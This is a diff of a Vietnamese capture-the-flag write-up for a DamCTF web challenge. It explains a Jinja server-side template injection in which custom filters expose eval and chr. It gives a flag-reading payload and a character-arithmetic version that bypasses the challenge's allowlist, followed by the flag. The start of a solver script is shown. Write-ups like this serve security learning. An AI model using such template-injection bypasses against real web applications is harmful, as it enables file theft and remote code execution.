@@ -27,18 +27,19 @@ def index(path=""):
 from check import detect_remove_hacks
 from filters import *
 ```
-để ý đoạn này, tệp app.py có tham chiếu đến 2 file khác là __check.py__ và __filters.py__ vậy ta chỉ cần truy cập đến 
-đường dẫn `https://super-secure-translation-implementation.chals.damctf.xyz/check.py` để đọc tệp __check.py__ 
+để ý đoạn này, file app.py có tham chiếu đến 2 file khác là __check.py__ và __filters.py__ vậy ta chỉ cần truy cập đến 
+đường dẫn `https://super-secure-translation-implementation.chals.damctf.xyz/check.py` để xem nội dung file __check.py__ 
 ![img](https://github.com/magnetohvcs/ctf/blob/main/damctf/image/7.png)
-và đường dẫn `https://super-secure-translation-implementation.chals.damctf.xyz/filters.py` để đọc tệp __filters.py__
+và đường dẫn `https://super-secure-translation-implementation.chals.damctf.xyz/filters.py` để xem nội dung __filters.py__
 ![img](https://github.com/magnetohvcs/ctf/blob/main/damctf/image/8.png)
-</br>tóm tắt là chỉ cần chèn payload vào __/secure_translate?payload=__ để tấn công ssti và chỉ có một số ký tự được cho phép còn lại đều bị chặn
+</br>tóm tắt là chỉ cần chèn payload vào __/secure_translate?payload=__ để tấn công ssti nhưng chỉ có một số ký tự được cho phép còn lại đều bị filter
+</br> những ký tự không bị filter
 ```  
 allowlist = [
         "c", "{","}","d","6","l","(","b","o","r",")",'"',"1","4","+","h","u","-","*","e","|","'",
  ]
 ```
-và ở tệp __app.py__ có những dòng lệnh này
+Phân tích một chút những dòng lệnh này ở file __app.py__
 ```
 server = Flask(__name__)
 
@@ -51,7 +52,7 @@ server.jinja_env.filters["order"] = order
 server.jinja_env.filters["ch"] = character
 server.jinja_env.filters["e"] = e
 ```
-tóm gọn là ý nghĩa rằng hàm e là __eval__ và hàm ch là __chr__, ta sẽ quan tâm một xíu ở hàm e (đọc file filters.py)
+tóm tắt là ý nghĩa rằng hàm e là __eval__ và hàm ch là __chr__ được tham chiều từ file check.py, ta sẽ tiếp tục phân ở hàm e xem file filters.py
 ```
 def e(x):
     # Security analysts reviewed this and said eval is unsafe (haters).
@@ -74,10 +75,11 @@ def e(x):
     except Exception as exc:
         return f"Eval Failed: {exc}"
 ```
-4 ký tự đầu không được là __open__ và __exec__ , payload ban đầu của tôi là `{{(""+open('/flag').read())|e}}` để bypass filter tôi đã sửa thành `{{('""%2bo'%2b((111%2b1)|ch)%2b'e'%2b((111-1)|ch)%2b'("'%2b((46%2b1)|ch)%2b((114-11-1)|ch)%2b'l'%2b((46%2b46%2b6-1)|ch)%2b((114-11)|ch)%2b'")'%2b(46|ch)%2b're'%2b((46%2b46%2b6-1)|ch)%2b'd()')|e}}` độ dài payload 153, giới hạn độ dài của tác giả là 161
+4 ký tự đầu không được là __open__ và __exec__ 
+</br>Payload của tôi là `{{(""+open('/flag').read())|e}}` để bypass filter tôi đã sửa thành `{{('""%2bo'%2b((111%2b1)|ch)%2b'e'%2b((111-1)|ch)%2b'("'%2b((46%2b1)|ch)%2b((114-11-1)|ch)%2b'l'%2b((46%2b46%2b6-1)|ch)%2b((114-11)|ch)%2b'")'%2b(46|ch)%2b're'%2b((46%2b46%2b6-1)|ch)%2b'd()')|e}}` độ dài payload 153, giới hạn độ dài của payload qui định là 161
 </br> và đây là
 flag mà tôi tìm được __dam{p4infu1_all0wl1st_w3ll_don3}__
-</br> cách giải của tôi. bài này mệt vl mất 1h
+</br> cách giải của tôi
 ```
 
 import requests
